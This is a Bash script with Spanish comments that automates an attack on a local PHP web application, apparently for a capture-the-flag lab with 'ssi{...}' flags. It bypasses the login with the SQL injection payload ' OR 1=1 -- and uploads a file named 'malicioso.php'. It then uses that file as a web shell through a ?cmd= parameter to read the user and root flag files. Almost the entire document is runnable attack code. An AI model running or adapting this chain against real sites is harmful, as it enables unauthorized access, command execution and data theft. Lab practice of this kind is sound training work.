#!/bin/bash

# Instalar curl si no está instalado
sudo apt install curl -y

# URLs de la página de login y upload
URL_LOGIN="http://localhost/pagina/login.php"
URL_UPLOAD="http://localhost/pagina/upload.php"
FILE_PATH="/var/www/html/pagina/malicioso.php"

# Archivo para almacenar cookies
COOKIE_FILE="cookies.txt"

# Payload malicioso para SQL Injection
PAYLOAD_USERNAME="' OR 1=1 -- "
PAYLOAD_PASSWORD="' OR 1=1 -- "

# Enviar la solicitud POST para login usando curl y guardar las cookies
echo "[*] Enviando payload al login..."
curl -s -X POST -d "username=$PAYLOAD_USERNAME&password=$PAYLOAD_PASSWORD" -c "$COOKIE_FILE" $URL_LOGIN > /dev/null

# Verificar si logramos el acceso
if grep -q "PHPSESSID" "$COOKIE_FILE"; then
    echo "[+] Acceso concedido. Hemos bypassado el login."
else
    echo "[-] No se logró el acceso. Verifica el payload y el endpoint."
    exit 1
fi

if [ ! -f "$FILE_PATH" ]; then
    echo "[-] El archivo $FILE_PATH no existe."
    exit 1
fi

# Enviar el archivo usando curl con cookies
echo "[*] Subiendo el archivo $FILE_PATH al servidor..."
RESPONSE=$(curl -s -X POST -F "file=@$FILE_PATH" -b "$COOKIE_FILE" $URL_UPLOAD)

if echo "$RESPONSE" | grep -q "File successfully uploaded"; then
    echo "[+] Archivo subido con éxito."

    # Extraer el enlace del archivo subido
    FILE_URL=$(echo "$RESPONSE" | grep -oP "(?<=<a href=')[^']+")
    FULL_FILE_URL="http://localhost/pagina/$FILE_URL"
    echo "[*] Accediendo al archivo subido en: $FULL_FILE_URL"
    
    # Acceder al archivo subido y ejecutar comandos
    echo "[*] Extrayendo la flag de www-data"
    CMD="cat /home/www-data/user.txt"
    ENCODED_CMD=$(echo "$CMD" | jq -sRr @uri) # Se necesita jq para codificar URL
    FILE_RESPONSE=$(curl -s -b "$COOKIE_FILE" "${FULL_FILE_URL}?cmd=${ENCODED_CMD}")
    
    # Extraer y mostrar la flag de usuario
    USER_FLAG=$(echo "$FILE_RESPONSE" | grep -o "ssi{[^}]*}" | tail -n 1)
    echo "[+] Flag de www-data: $USER_FLAG" 

    echo "[*] Extrayendo la flag de root"
    CMD="cat /root/root.txt"
    ENCODED_CMD=$(echo "$CMD" | jq -sRr @uri)
    FILE_RESPONSE=$(curl -s -b "$COOKIE_FILE" "${FULL_FILE_URL}?cmd=${ENCODED_CMD}")
    
    # Extraer y mostrar la flag de root
    ROOT_FLAG=$(echo "$FILE_RESPONSE" | grep -o "ssi{[^}]*}" | tail -n 1)
    echo "[+] Flag de root: $ROOT_FLAG" 
else
    echo "[-] Error al subir el archivo. Respuesta del servidor:"
    echo "$RESPONSE"
fi
